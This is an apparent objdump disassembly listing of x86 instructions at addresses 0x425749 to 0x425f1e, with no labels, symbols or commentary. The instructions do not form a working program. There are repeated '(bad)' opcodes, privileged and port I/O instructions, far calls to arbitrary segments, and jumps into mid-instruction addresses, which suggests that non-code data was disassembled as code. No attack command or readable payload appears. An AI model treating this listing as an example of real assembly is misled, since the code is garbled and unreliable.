  425749:	mov    WORD PTR [ebx],es
  42574b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42574c:	enter  0xca76,0x3e
  425750:	shr    BYTE PTR [ebx+esi*1-0x2b],0x41
  425755:	fcmovnbe st,st(6)
  425757:	rdmsr  
  425759:	push   es
  42575a:	aaa    
  42575b:	test   eax,0xe49356cd
  425760:	lods   al,BYTE PTR ds:[esi]
  425761:	adc    DWORD PTR [ebx+eiz*1+0x68],eax
  425765:	adc    ah,BYTE PTR [ecx]
  425767:	jbe    0x42570b
  425769:	hlt    
  42576a:	scas   al,BYTE PTR es:[edi]
  42576b:	call   0xdf5c:0xc5fcfd55
  425772:	mov    bh,0x81
  425774:	scas   al,BYTE PTR es:[edi]
  425775:	ret    0x3435
  425778:	pop    eax
  425779:	test   BYTE PTR [edi+0x3b],0x58
  42577d:	fs stos BYTE PTR es:[edi],al
  42577f:	dec    edi
  425780:	cmp    DWORD PTR [eax+0x17],edi
  425783:	pop    esi
  425785:	popf   
  425786:	sahf   
  425787:	sub    eax,0xfbfefbed
  42578c:	out    0xf8,eax
  42578e:	enter  0x2c85,0xa2
  425792:	ins    BYTE PTR es:[edi],dx
  425793:	leave  
  425794:	arpl   WORD PTR [ebp-0x4],ax
  425797:	jnp    0x425748
  425799:	xchg   ebp,eax
  42579a:	or     bh,BYTE PTR [ebx-0x5f]
  42579d:	into   
  42579e:	dec    eax
  42579f:	inc    edx
  4257a0:	xchg   ebp,eax
  4257a1:	push   ebp
  4257a2:	call   0x5dd4bd87
  4257a7:	mov    ds:0x9ee3bcc6,eax
  4257ac:	push   esi
  4257ad:	jg     0x4257ae
  4257af:	out    dx,eax
  4257b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257b1:	scas   eax,DWORD PTR es:[edi]
  4257b2:	mov    eax,ds:0xed9452b8
  4257b7:	mov    BYTE PTR gs:[edi-0x5b7c528f],ch
  4257be:	ja     0x42581f
  4257c0:	mov    edi,0xa90e711a
  4257c5:	adc    dl,ah
  4257c7:	push   ebp
  4257c8:	ss pop edi
  4257ca:	mov    ebp,0x261d081e
  4257cf:	jmp    0x25a9:0x5bc90e48
  4257d6:	jne    0x425830
  4257d8:	jns    0x425840
  4257da:	test   eax,0x561367dc
  4257df:	push   ecx
  4257e0:	lahf   
  4257e1:	mov    edx,0xf9a1e980
  4257e6:	ins    BYTE PTR es:[edi],dx
  4257e7:	dec    ecx
  4257e8:	adc    eax,DWORD PTR [edx+0x70]
  4257eb:	aas    
  4257ec:	mov    eax,ds:0xeb3b2de4
  4257f1:	ins    DWORD PTR es:[edi],dx
  4257f2:	and    eax,0x17df5550
  4257f7:	mov    edi,0x884cf1b
  4257fc:	enter  0x9994,0xf0
  425800:	shl    DWORD PTR [ecx-0x2a],1
  425803:	mov    WORD PTR [ebp+0x13],?
  425806:	jmp    0xddbc:0x6698fd6
  42580d:	jae    0x4257c6
  42580f:	(bad)  
  425810:	cmp    al,0x4
  425812:	cld    
  425813:	push   ss
  425814:	mov    dl,0x49
  425816:	pushf  
  425817:	fidiv  DWORD PTR [eax+0x2]
  42581a:	jl     0x42581c
  42581c:	xor    esi,ecx
  42581e:	and    edx,DWORD PTR [eax]
  425820:	rcl    BYTE PTR [edx],cl
  425822:	xor    DWORD PTR [ecx+ebx*2],0xffffff9d
  425826:	mov    esi,0x2ef8f83
  42582b:	cs pop eax
  42582d:	loopne 0x42584f
  42582f:	jns    0x425848
  425831:	das    
  425832:	xor    al,0xa6
  425834:	pop    edx
  425835:	pushf  
  425836:	mov    dl,0x74
  425838:	sbb    dh,BYTE PTR [eax+0x28]
  42583b:	fsubr  QWORD PTR [edi+0x7e]
  42583e:	icebp  
  42583f:	jmp    FWORD PTR [esi]
  425841:	ror    BYTE PTR [edx+0xffef425],1
  425847:	inc    ebp
  425848:	mov    ds:0x82bf1912,al
  42584d:	sub    cl,dh
  42584f:	out    0x4e,eax
  425851:	iret   
  425852:	or     BYTE PTR [edx-0x663a93c8],0x8a
  425859:	jl     0x4258b3
  42585b:	dec    edi
  42585c:	imul   edx,DWORD PTR [esp+esi*2-0x1a608bee],0xffffffe1
  425864:	inc    ebx
  425865:	push   esp
  425866:	push   0xffffffd4
  425868:	ss push cs
  42586a:	add    al,0x68
  42586c:	xchg   esp,eax
  42586d:	popa   
  42586e:	mov    ebx,0x768f8b54
  425873:	icebp  
  425874:	int    0x96
  425876:	rcr    al,1
  425878:	not    DWORD PTR [edi-0x746785f6]
  42587e:	and    BYTE PTR [ebx+0x1f8ab95b],bh
  425884:	sub    BYTE PTR [eax],bh
  425886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425887:	and    eax,0xccc81ec1
  42588c:	ins    BYTE PTR es:[edi],dx
  42588d:	sbb    ecx,ecx
  42588f:	push   ss
  425890:	or     eax,0x134a4838
  425895:	test   esp,edi
  425897:	popf   
  425898:	ret    
  425899:	in     al,0x5b
  42589b:	mov    eax,0x4e3afdb8
  4258a0:	stos   DWORD PTR es:[edi],eax
  4258a1:	add    al,0x1c
  4258a3:	int3   
  4258a4:	je     0x425838
  4258a6:	cmp    al,0x2c
  4258a8:	xor    dl,cl
  4258aa:	jbe    0x42585a
  4258ac:	shr    DWORD PTR [eax-0x2d],1
  4258af:	xor    DWORD PTR [edi+0x7cb63bf3],ecx
  4258b5:	dec    eax
  4258b6:	or     al,0x4f
  4258b8:	mov    al,ds:0xc4e95e5f
  4258bd:	leave  
  4258be:	add    eax,0xb09c743e
  4258c3:	and    DWORD PTR [edi-0x55fb3803],edx
  4258c9:	in     al,dx
  4258ca:	and    ecx,DWORD PTR [ebx-0x3e]
  4258cd:	pushf  
  4258ce:	rcl    DWORD PTR [ecx+eiz*8+0x2e50b78],0xc4
  4258d6:	sbb    eax,0xd55bbf0a
  4258db:	jne    0x4258ac
  4258dd:	cmp    edi,0x8eec926a
  4258e3:	dec    esp
  4258e4:	jae    0x425903
  4258e6:	ror    esp,1
  4258e8:	and    eax,0x8673e3b6
  4258ed:	stos   BYTE PTR es:[edi],al
  4258ee:	jmp    0x425882
  4258f0:	nop
  4258f1:	ds push edx
  4258f3:	mov    ecx,0xa528ef46
  4258f8:	fidivr WORD PTR [esi-0x623c5e2a]
  4258fe:	ds xchg edx,eax
  425900:	ret    
  425901:	rcl    ch,1
  425903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425904:	std    
  425905:	loop   0x4258ec
  425907:	adc    al,BYTE PTR [ebx+0x791dc417]
  42590d:	cmp    BYTE PTR [eax],al
  42590f:	in     eax,0x6b
  425911:	xlat   BYTE PTR ds:[ebx]
  425912:	push   0xffffff8c
  425914:	call   edi
  425916:	ins    WORD PTR es:[edi],dx
  425918:	add    eax,0x91f1a7a7
  42591d:	cmp    eax,0x9616c8d9
  425922:	and    BYTE PTR [eax],al
  425924:	cld    
  425925:	lds    ebx,FWORD PTR [edi+0x1e]
  425928:	popa   
  425929:	cmp    DWORD PTR [ebx-0x1f],eax
  42592c:	mov    eax,ds:0xa8506020
  425931:	jae    0x42593e
  425933:	jbe    0x42599f
  425935:	pop    ds
  425936:	xchg   esp,eax
	...
  42593f:	add    BYTE PTR [eax],al
  425941:	in     al,dx
  425942:	test   BYTE PTR [eax-0x5f],ah
  425945:	push   0xedcdede5
  42594a:	cld    
  42594b:	mov    BYTE PTR [ebx+0x1faa6630],ah
  425951:	mov    bl,0xd0
  425953:	add    DWORD PTR [eax],eax
  425955:	scas   al,BYTE PTR es:[edi]
  425956:	add    eax,DWORD PTR [eax]
  425958:	add    ah,ah
  42595a:	xor    al,0x7d
  42595c:	in     eax,0x9d
  42595e:	mov    dh,0xb4
  425960:	pop    ds
  425961:	rol    DWORD PTR [esi+0x6f],0x86
  425965:	pop    edi
  425966:	inc    eax
  425967:	xchg   esp,eax
  425968:	dec    ecx
  425969:	rcl    DWORD PTR [ebx+edi*8],0x49
  42596d:	(bad)  
  42596e:	sbb    esp,DWORD PTR [ebx+ebp*2+0x67a0b156]
  425975:	lods   eax,DWORD PTR ds:[esi]
  425976:	les    eax,FWORD PTR [ecx-0x272c6a08]
  42597c:	fwait
  42597d:	inc    ecx
  42597e:	mov    BYTE PTR [edi-0x47],dh
  425981:	lock jmp 0xdc14e18b
  425987:	xor    DWORD PTR [esp+eiz*8],ebp
  42598a:	mov    dl,0x5b
  42598c:	dec    ecx
  42598d:	sub    DWORD PTR [ebx-0x2066adee],ecx
  425993:	outs   dx,BYTE PTR ds:[esi]
  425994:	mov    al,ds:0xa41c9721
  425999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42599a:	cld    
  42599b:	int3   
  42599c:	dec    ecx
  42599d:	push   eax
  42599e:	push   esi
  42599f:	push   ss
  4259a0:	or     DWORD PTR [esi+0x748ef535],0xfffffffa
  4259a7:	add    ebx,DWORD PTR [ecx-0x42b5b23e]
  4259ad:	mov    al,ds:0xbd88acd2
  4259b2:	xchg   esp,eax
  4259b3:	outs   dx,BYTE PTR ds:[esi]
  4259b4:	xchg   ebx,eax
  4259b5:	mov    al,ds:0x340afaec
  4259ba:	retf   
  4259bb:	adc    al,0x4e
  4259bd:	(bad)  
  4259be:	jecxz  0x425a02
  4259c0:	adc    eax,0x7a17d7ab
  4259c5:	push   edi
  4259c6:	adc    eax,edx
  4259c8:	test   BYTE PTR [edi+0x73dffe08],bh
  4259ce:	inc    edi
  4259cf:	mov    ds:0x410a377,al
  4259d4:	das    
  4259d5:	pop    ds
  4259d6:	pusha  
  4259d7:	xchg   esi,eax
  4259d8:	daa    
  4259d9:	test   al,0x3c
  4259db:	hlt    
  4259dc:	sahf   
  4259dd:	mov    eax,0x34e9d70b
  4259e2:	xchg   ecx,eax
  4259e3:	inc    edx
  4259e4:	fwait
  4259e5:	mov    edx,0x20145968
  4259ea:	sbb    al,0x6d
  4259ec:	xor    al,0xa1
  4259ee:	call   0x72967e3c
  4259f3:	out    dx,eax
  4259f4:	xchg   ecx,eax
  4259f5:	inc    ebp
  4259f6:	sub    DWORD PTR cs:[esi-0x6a60b27d],0x1350261
  425a01:	cwde   
  425a02:	adc    DWORD PTR [esi+0x4bc3e10b],edx
  425a08:	push   esp
  425a09:	mov    ah,0xad
  425a0b:	leave  
  425a0c:	push   ss
  425a0d:	push   0xffffffc9
  425a0f:	mov    ch,0x23
  425a11:	ja     0x425a8a
  425a13:	retf   
  425a14:	scas   eax,DWORD PTR es:[edi]
  425a15:	mov    esi,0xa8fbc97a
  425a1a:	mov    bh,0x77
  425a1c:	lods   eax,DWORD PTR ds:[esi]
  425a1d:	loop   0x425a72
  425a1f:	jmp    FWORD PTR [esi-0x1725c70d]
  425a25:	mov    edi,0xbfc3de07
  425a2a:	cmp    esi,DWORD PTR [esi-0x34]
  425a2d:	inc    edi
  425a2e:	out    0x24,al
  425a30:	pop    ds
  425a31:	dec    ebx
  425a32:	(bad)  [ecx+0x69]
  425a35:	aas    
  425a36:	out    dx,eax
  425a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a38:	sbb    al,0xe
  425a3a:	in     al,0x6
  425a3c:	into   
  425a3d:	adc    esi,DWORD PTR [ecx-0x6262ab35]
  425a43:	dec    esi
  425a44:	sar    BYTE PTR [ebx+0x63e11cc9],0xb9
  425a4b:	rcl    DWORD PTR [edi-0x383ce6ae],0x36
  425a52:	int3   
  425a53:	in     eax,0x1d
  425a55:	imul   esi,DWORD PTR [eax-0x1e],0xffffff90
  425a59:	push   ds
  425a5a:	dec    edx
  425a5b:	mov    eax,esi
  425a5d:	xchg   DWORD PTR [ecx-0x63ffdadd],ebp
  425a63:	mov    ecx,0x171193d
  425a68:	icebp  
  425a69:	add    BYTE PTR ss:[ebx],al
  425a6c:	add    dl,BYTE PTR [ebx+0x17]
  425a6f:	jo     0x425a09
  425a71:	in     eax,0xb1
  425a73:	pop    edx
  425a74:	push   edx
  425a75:	aad    0xf6
  425a77:	enter  0xf26f,0xf6
  425a7b:	mov    ebx,0x85cf355b
  425a80:	pop    esp
  425a81:	and    bh,BYTE PTR [ebx+ecx*4-0x5e]
  425a85:	adc    al,0xa
  425a87:	push   edi
  425a88:	xor    DWORD PTR [esi+0x19],ebp
  425a8b:	xchg   edi,eax
  425a8c:	pop    esp
  425a8d:	test   al,0xad
  425a8f:	pop    ecx
  425a90:	test   DWORD PTR [esi-0x6f116ead],esp
  425a96:	xlat   BYTE PTR ds:[ebx]
  425a97:	(bad)  
  425a98:	jo     0x425b0a
  425a9a:	inc    ecx
  425a9b:	arpl   WORD PTR [eax-0x5f],si
  425a9e:	dec    ebp
  425a9f:	dec    esi
  425aa0:	inc    ebp
  425aa1:	pusha  
  425aa2:	inc    ebx
  425aa3:	xchg   esi,eax
  425aa4:	adc    BYTE PTR [esi],dl
  425aa6:	dec    ecx
  425aa7:	scas   al,BYTE PTR es:[edi]
  425aa8:	rcl    bh,0x95
  425aab:	mov    cl,0xc8
  425aad:	jnp    0x425a3e
  425aaf:	or     BYTE PTR [edi+0x6364a015],0x20
  425ab6:	test   eax,0x99424b42
  425abb:	out    dx,al
  425abc:	inc    edx
  425abd:	jnp    0x425a4a
  425abf:	fmul   st(6),st
  425ac1:	mov    eax,0x8d6feb69
  425ac6:	repnz ds push 0xdfb0c144
  425acd:	fstp   TBYTE PTR [edi]
  425acf:	and    DWORD PTR [ebp-0x6e],0x9731a0a5
  425ad6:	ror    BYTE PTR [ecx-0x3],1
  425ad9:	mov    al,0xd6
  425adb:	jo     0x425b36
  425add:	jae    0x425ad0
  425adf:	(bad)  
  425ae0:	push   esp
  425ae1:	rol    BYTE PTR [eax],cl
  425ae3:	sbb    dl,BYTE PTR [esp+ebp*1]
  425ae6:	xor    BYTE PTR [ebp+0x4efb998f],dh
  425aec:	mov    esi,DWORD PTR ds:0x5c51e97f
  425af2:	(bad)  [ecx-0x36d62006]
  425af8:	mov    eax,ds:0xfd82ac5e
  425afd:	xor    DWORD PTR [ecx+ecx*1],eax
  425b00:	push   ebp
  425b01:	leave  
  425b02:	lahf   
  425b03:	hlt    
  425b04:	pop    esp
  425b05:	push   0x218fc99a
  425b0a:	ret    0xc3c
  425b0d:	mov    DWORD PTR [esi+0x381eddbe],edx
  425b13:	fisub  DWORD PTR [esi]
  425b15:	push   0xffffffab
  425b17:	add    eax,DWORD PTR [edx+0x2]
  425b1a:	mov    ds:0x3ba53f0b,eax
  425b1f:	mov    ah,0x19
  425b21:	(bad)  
  425b23:	inc    ebx
  425b24:	and    al,0x4a
  425b26:	pop    ecx
  425b27:	fstp   QWORD PTR [ebp-0xc264202]
  425b2d:	add    DWORD PTR ds:[eax],edi
  425b30:	int    0x18
  425b32:	mov    al,0x20
  425b34:	inc    edx
  425b35:	adc    al,0x5e
  425b37:	push   eax
  425b38:	jecxz  0x425b92
  425b3a:	das    
  425b3b:	call   0x8c1a:0xe9255ca7
  425b42:	pop    edi
  425b43:	and    ch,BYTE PTR [eax+edi*8-0x43]
  425b47:	cmp    al,0x6b
  425b49:	ds mov edi,0xf54a15bb
  425b4f:	inc    eax
  425b50:	xchg   BYTE PTR [esi],cl
  425b52:	xor    bh,BYTE PTR [ebp+0x3d36608b]
  425b58:	push   0x2cd8e9da
  425b5d:	stc    
  425b5e:	cmp    BYTE PTR [edi],ah
  425b60:	sbb    eax,0x16876e0b
  425b65:	test   DWORD PTR ss:[edx],ecx
  425b68:	jecxz  0x425b9e
  425b6a:	(bad)  
  425b6b:	mov    eax,ds:0x7df29ab9
  425b70:	add    edi,ecx
  425b72:	stc    
  425b73:	fisttp QWORD PTR [ebx]
  425b75:	loopne 0x425b80
  425b77:	add    DWORD PTR [edx+eiz*4+0x32],edi
  425b7b:	ror    BYTE PTR [edi+0x28],0x6e
  425b7f:	jmp    0x316e:0xfadfefc9
  425b86:	sar    cl,0xd1
  425b89:	jo     0x425b25
  425b8b:	out    0x2e,al
  425b8d:	jge    0x425b3d
  425b8f:	adc    dl,BYTE PTR [edx+eax*2-0x3ac4cf31]
  425b96:	dec    ebx
  425b97:	push   ebp
  425b98:	dec    edx
  425b99:	add    esi,DWORD PTR [edx+eiz*2]
  425b9c:	cmp    esp,ecx
  425b9e:	not    DWORD PTR cs:[ebp-0x3065e4c7]
  425ba5:	xor    BYTE PTR [ebx-0x13],bl
  425ba8:	lods   eax,DWORD PTR ds:[esi]
  425ba9:	mov    esp,0x8d280a3d
  425bae:	xor    DWORD PTR [bx+si],eax
  425bb1:	popf   
  425bb2:	or     bl,0x27
  425bb5:	rol    BYTE PTR [esi-0x1c],cl
  425bb8:	hlt    
  425bb9:	(bad)  
  425bba:	cmp    BYTE PTR [ecx+0x266a6177],cl
  425bc0:	push   es
  425bc1:	sbb    cl,BYTE PTR [edi-0x39]
  425bc4:	pop    esi
  425bc5:	in     eax,0xa6
  425bc7:	loop   0x425bca
  425bc9:	and    al,0x2a
  425bcb:	xlat   BYTE PTR ds:[ebx]
  425bcc:	pop    es
  425bcd:	push   edx
  425bce:	sub    al,0xa3
  425bd0:	sub    esp,esp
  425bd2:	aad    0xa8
  425bd4:	popa   
  425bd5:	xlat   BYTE PTR ds:[ebx]
  425bd6:	fnop   
  425bd8:	pusha  
  425bd9:	jle    0x425c18
  425bdb:	inc    edi
  425bdc:	mov    eax,ds:0x2a3c0555
  425be2:	jge    0x425c40
  425be4:	enter  0xb92f,0xc9
  425be8:	jge    0x425bab
  425bea:	jne    0x425b8e
  425bec:	xchg   ebx,eax
  425bed:	rcr    bx,cl
  425bf0:	int    0xe
  425bf2:	out    0x8a,al
  425bf4:	mov    dh,BYTE PTR [edi-0x50]
  425bf7:	sbb    ah,al
  425bf9:	mov    ebp,0x9f3d3e25
  425bfe:	jno    0x425c65
  425c00:	mov    bl,0x92
  425c02:	test   al,0xfe
  425c04:	jo     0x425c1d
  425c06:	adc    edx,DWORD PTR [ebx-0x42]
  425c09:	mov    ch,al
  425c0b:	and    eax,0xd6da69d3
  425c10:	loop   0x425bfb
  425c12:	inc    edx
  425c13:	xor    esp,ecx
  425c15:	sbb    al,BYTE PTR [edi+0x6f]
  425c18:	push   0xa436a9fc
  425c1d:	push   es
  425c1e:	or     esp,ecx
  425c20:	sbb    eax,ebp
  425c22:	mov    eax,0x1d9408cd
  425c27:	and    dl,BYTE PTR [edx+ecx*4+0x22]
  425c2b:	mov    es,ecx
  425c2d:	mov    edi,0x567280cc
  425c32:	mov    ds:0xa8209103,al
  425c37:	and    edi,DWORD PTR [ebx-0x27abead2]
  425c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c3e:	(bad)  
  425c40:	pop    esi
  425c41:	pop    ebx
  425c42:	push   ds
  425c43:	xchg   ebx,eax
  425c44:	push   ebp
  425c45:	ins    DWORD PTR es:[edi],dx
  425c46:	jmp    DWORD PTR [eax]
  425c48:	js     0x425c95
  425c4a:	mov    ds:0x792882ae,al
  425c4f:	adc    cl,BYTE PTR es:[ecx-0x73]
  425c53:	mov    bl,0x2f
  425c55:	cwde   
  425c56:	loop   0x425c54
  425c58:	lods   eax,DWORD PTR ds:[esi]
  425c59:	loope  0x425cc4
  425c5b:	xchg   BYTE PTR [ecx+0x2e],cl
  425c5e:	sub    DWORD PTR [eax],edx
  425c60:	out    0x42,al
  425c62:	neg    DWORD PTR [edi-0x4366ed0f]
  425c68:	adc    al,0xde
  425c6a:	xor    DWORD PTR [eax],eax
  425c6c:	mov    DWORD PTR [ecx],ecx
  425c6e:	int3   
  425c6f:	mov    esp,0xb3e93695
  425c74:	mov    ds:0x2c150e08,al
  425c79:	add    dh,cl
  425c7b:	mov    DWORD PTR [edi+edx*4+0x7d],ecx
  425c7f:	sbb    eax,0xa3b36b02
  425c84:	cmp    DWORD PTR [eax+edx*8+0x61],eax
  425c88:	adc    bh,BYTE PTR [eax]
  425c8a:	fbld   TBYTE PTR [edx]
  425c8c:	pusha  
  425c8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c8e:	mov    DWORD PTR [ebp-0x2478bfbb],edi
  425c94:	es scas al,BYTE PTR es:[edi]
  425c96:	ret    0xa497
  425c99:	iret   
  425c9a:	mov    dh,0x80
  425c9c:	dec    ecx
  425c9d:	sbb    dh,BYTE PTR [eax]
  425c9f:	test   BYTE PTR fs:[eax],bl
  425ca2:	and    eax,0x65bf0c8d
  425ca7:	retf   0xe752
  425caa:	xor    dl,BYTE PTR [eax+0x63d781d5]
  425cb0:	aaa    
  425cb1:	js     0x425c45
  425cb3:	je     0x425c5d
  425cb5:	mov    sp,sp
  425cb8:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  425cba:	or     BYTE PTR [edx+0x2880371c],al
  425cc0:	ins    DWORD PTR es:[edi],dx
  425cc1:	adc    DWORD PTR [esi+0x3d],esi
  425cc4:	cli    
  425cc5:	int3   
  425cc6:	leave  
  425cc7:	in     eax,dx
  425cc8:	xchg   ebp,eax
  425cc9:	inc    esi
  425cca:	add    dl,BYTE PTR [eax+0x68]
  425ccd:	mov    dl,0x50
  425ccf:	ret    
  425cd0:	ror    BYTE PTR [edi-0x71],cl
  425cd3:	outs   dx,BYTE PTR ds:[esi]
  425cd4:	add    BYTE PTR [edx-0x25df94ce],ah
  425cda:	inc    esi
  425cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425cdc:	sub    ah,BYTE PTR [edx+0x37be65e4]
  425ce2:	stc    
  425ce3:	xchg   ecx,eax
  425ce4:	je     0x425cb2
  425ce6:	dec    ebx
  425ce7:	fild   QWORD PTR [edi+0x15]
  425cea:	outs   dx,DWORD PTR ds:[esi]
  425ceb:	lds    ebp,FWORD PTR [edx*4+0x73024f9d]
  425cf2:	test   DWORD PTR [ebx-0x18],ebx
  425cf5:	push   ds
  425cf6:	(bad)  
  425cf7:	sub    BYTE PTR [edx],bl
  425cf9:	push   ebp
  425cfa:	mov    ebp,0xc867b673
  425cff:	sbb    edi,DWORD PTR [ebp+ebx*1-0x5b20831c]
  425d06:	jo     0x425d08
	...
  425d10:	add    BYTE PTR [edx+0x51],bl
  425d13:	leave  
  425d14:	popf   
  425d15:	retf   
  425d16:	popf   
  425d17:	pop    esi
  425d18:	xlat   BYTE PTR ds:[ebx]
  425d19:	loope  0x425d6f
  425d1b:	fs lock jl 0x425d39
  425d1f:	fmul   DWORD PTR [eax]
  425d21:	popa   
  425d22:	aam    0x1
  425d24:	add    BYTE PTR [esi+0x18000003],ch
  425d2a:	daa    
  425d2b:	inc    ecx
  425d2c:	ss sbb al,0x35
  425d2f:	xchg   BYTE PTR [esi],dl
  425d31:	adc    esi,DWORD PTR [ebp+0x7b]
  425d34:	mov    eax,0x5fc973d1
  425d39:	adc    eax,0xd0ee2b7b
  425d3e:	inc    esp
  425d3f:	js     0x425dbc
  425d41:	xor    BYTE PTR [edx-0x36],dl
  425d44:	pop    ss
  425d45:	js     0x425cd8
  425d47:	cli    
  425d48:	push   ecx
  425d49:	push   0xac31f2ac
  425d4e:	push   ebp
  425d4f:	outs   dx,BYTE PTR ds:[esi]
  425d50:	and    dh,dh
  425d52:	mov    al,BYTE PTR [edx+0x55dafacf]
  425d58:	(bad)  
  425d59:	fs das 
  425d5b:	dec    edi
  425d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d5d:	inc    ebp
  425d5e:	jb     0x425ce0
  425d60:	mov    bh,0xdb
  425d62:	popa   
  425d63:	sar    DWORD PTR [ebp+0x2d3932],0xfa
  425d6a:	fadd   QWORD PTR [esi]
  425d6c:	or     eax,0xcbf88fcd
  425d71:	jmp    0x425d92
  425d73:	dec    esi
  425d74:	jmp    0x6199:0x71a22922
  425d7b:	aaa    
  425d7c:	stos   DWORD PTR es:[edi],eax
  425d7d:	ror    DWORD PTR [ebp-0x4309003a],1
  425d83:	jle    0x425d59
  425d85:	neg    BYTE PTR gs:[ecx+0xd]
  425d89:	mov    DWORD PTR [esi+0x43],edx
  425d8c:	dec    esi
  425d8d:	or     DWORD PTR [edx+0x35],edi
  425d90:	sub    esp,DWORD PTR [eax-0x1f83186d]
  425d96:	mov    ecx,0xd2b1b70
  425d9b:	pop    eax
  425d9c:	fs xchg ecx,eax
  425d9e:	mov    esi,0x19f20d22
  425da3:	ds jae 0x425d3f
  425da6:	jae    0x425d42
  425da8:	mov    DWORD PTR [edx-0x1b6f9a2d],ecx
  425dae:	pop    ds
  425daf:	inc    eax
  425db0:	or     eax,0x755e397d
  425db5:	(bad)  
  425db6:	push   ss
  425db7:	and    esi,DWORD PTR [eax*4+0x4c49ac75]
  425dbe:	int3   
  425dbf:	gs adc dh,dl
  425dc2:	cmp    al,0xee
  425dc4:	jae    0x425ddd
  425dc6:	not    BYTE PTR [edx+0xc]
  425dc9:	and    ebx,esi
  425dcb:	mov    WORD PTR [edi-0x55669c70],es
  425dd1:	cmp    BYTE PTR [ebp-0x1d38f64a],dh
  425dd7:	xor    eax,0x7d59ac3d
  425ddc:	call   0xf744:0x57481e3f
  425de3:	sbb    ah,0xa1
  425de6:	pop    edi
  425de7:	pusha  
  425de8:	into   
  425de9:	fild   QWORD PTR [edi+ecx*2+0x7d]
  425ded:	jmp    0x425dc0
  425def:	dec    edi
  425df0:	xor    DWORD PTR ds:0x6ee70230,ebx
  425df6:	sbb    eax,0x3518ca9a
  425dfb:	shl    DWORD PTR [esp+edi*4],1
  425dfe:	xor    eax,0x7df06f1a
  425e03:	mov    al,ds:0xc3bdcfe1
  425e08:	ins    DWORD PTR es:[edi],dx
  425e09:	cmp    dl,al
  425e0b:	outs   dx,DWORD PTR ds:[esi]
  425e0c:	mov    al,ds:0x8fc4a278
  425e11:	mov    al,ds:0x6c79538d
  425e16:	retf   0x5edf
  425e19:	mov    ch,0x73
  425e1b:	popa   
  425e1c:	sbb    eax,edi
  425e1e:	jp     0x425dac
  425e20:	sbb    BYTE PTR [ebp+0x4749784a],dh
  425e26:	and    eax,DWORD PTR [edx-0x3b5aad5a]
  425e2c:	out    0xae,al
  425e2e:	(bad)  
  425e2f:	cmp    ebx,eax
  425e31:	pop    esp
  425e32:	call   0x5ec1:0x446f7343
  425e39:	add    BYTE PTR [edi-0xb],cl
  425e3c:	sbb    ebp,DWORD PTR [edx+0x46]
  425e3f:	dec    esi
  425e40:	in     al,0x33
  425e42:	xchg   DWORD PTR [edi+ebx*1],ebx
  425e45:	je     0x425e07
  425e47:	out    dx,al
  425e48:	sub    al,0x52
  425e4a:	pop    ecx
  425e4b:	fsub   st,st(5)
  425e4d:	and    BYTE PTR [edi-0x2f776480],ch
  425e53:	sbb    BYTE PTR [edx],ah
  425e55:	outs   dx,DWORD PTR ds:[esi]
  425e56:	mov    dh,BYTE PTR [edi+0x2b8e6b5f]
  425e5c:	imul   ebp,ecx,0x1f
  425e5f:	es pop esp
  425e61:	xchg   ecx,eax
  425e62:	add    DWORD PTR [eax+0x6],esi
  425e65:	ror    BYTE PTR [edx-0x36],0xec
  425e69:	sbb    al,0xc6
  425e6b:	sbb    BYTE PTR [edx-0x3b],0x37
  425e6f:	jge    0x425df7
  425e71:	sbb    DWORD PTR [esi-0x7450a243],edi
  425e77:	add    cl,BYTE PTR [eax+eiz*1-0x594c0a24]
  425e7e:	add    bl,BYTE PTR [edx+0x29]
  425e81:	(bad)  
  425e82:	loopne 0x425ead
  425e84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e85:	stc    
  425e86:	test   al,0x1e
  425e88:	dec    eax
  425e89:	sub    bh,BYTE PTR [edi]
  425e8b:	inc    edx
  425e8c:	mov    dh,0xf7
  425e8e:	in     al,0xca
  425e90:	stos   DWORD PTR es:[edi],eax
  425e91:	mov    esi,0xb9ade715
  425e96:	pop    ss
  425e97:	mov    al,0xdb
  425e99:	test   eax,0x8d43890b
  425e9e:	aam    0x97
  425ea0:	(bad)
  425ea3:	dec    esp
  425ea4:	fldenv [edx+eiz*8+0x30]
  425ea8:	or     esi,DWORD PTR [esi]
  425eaa:	or     ch,ch
  425eac:	jmp    0x425ecc
  425eae:	sub    al,0xf2
  425eb0:	inc    ecx
  425eb1:	xor    al,0x55
  425eb3:	add    esp,0x10a20116
  425eb9:	imul   edx,DWORD PTR [eax+0x7c],0x39
  425ebd:	add    BYTE PTR [ebp-0x437af51d],0x7f
  425ec4:	pop    eax
  425ec5:	ffree  st(6)
  425ec7:	es dec ecx
  425ec9:	pop    es
  425eca:	pop    edx
  425ecb:	jo     0x425ed4
  425ecd:	mov    edx,0xfac55f84
  425ed2:	sub    ebp,DWORD PTR [edi+0x25]
  425ed5:	mov    ah,0x68
  425ed7:	xor    al,0xb5
  425ed9:	enter  0xeb44,0x33
  425edd:	cmc    
  425ede:	aas    
  425edf:	test   BYTE PTR [ebx+0x725a1b64],al
  425ee5:	mov    ebx,0x6056d2bd
  425eea:	add    BYTE PTR [edi-0x6c],bh
  425eed:	mov    ch,0x63
  425eef:	push   ecx
  425ef0:	sahf   
  425ef1:	rcr    DWORD PTR [edx+0x63925bed],cl
  425ef7:	retf   0xe54f
  425efa:	sbb    dh,dl
  425efc:	stos   BYTE PTR es:[edi],al
  425efd:	mov    ch,0xca
  425eff:	(bad)  
  425f00:	fnstsw ax
  425f02:	loopne 0x425f34
  425f04:	je     0x425f0b
  425f06:	hlt    
  425f07:	popa   
  425f08:	in     eax,dx
  425f09:	pop    ss
  425f0a:	rcl    BYTE PTR [ecx],0x40
  425f0d:	fnstsw WORD PTR [ebx]
  425f0f:	cmp    bh,BYTE PTR [edx]
  425f11:	cmp    ch,al
  425f13:	test   DWORD PTR [edx+0x64f7e102],esp
  425f19:	retf   0x89df
  425f1c:	dec    edx
  425f1d:	ins    BYTE PTR es:[edi],dx
  425f1e:	lea    ecx,[esi-0x5f]
